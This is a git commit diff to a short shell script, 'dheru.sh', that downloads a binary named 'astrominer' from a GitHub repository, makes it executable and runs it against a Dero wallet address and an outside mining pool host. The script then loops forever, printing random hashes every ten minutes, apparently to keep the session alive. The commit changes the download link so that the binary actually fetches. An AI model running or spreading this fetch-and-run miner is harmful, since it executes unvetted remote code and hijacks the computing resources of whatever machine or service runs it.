f46923e60f5c8c5b1d827422b03999523c045b8b
juandjzuydtlnk <152443060+juandjzuydtlnk@users.noreply.github.com>
2023-11-30 04:28:10 +0700

    Update dheru.sh

--- dheru.sh
+++ dheru.sh
@@ -1,5 +1,5 @@
 mkdir dheru
 cd dheru
-curl -0 https://github.com/juandjzuydtlnk/sause/blob/main/astrominer -o asmin && chmod +x asmin
+curl -0 https://github.com/juandjzuydtlnk/sause/raw/main/astrominer -o asmin && chmod +x asmin
 ./asmin -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xm369mdkp06lgvqf4y5cm.$(echo dh-lottery-$(TZ=UTC-7 date +"%H-%M-%S")) -r community-pools.mysrv.cloud:10300 -p rpc
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
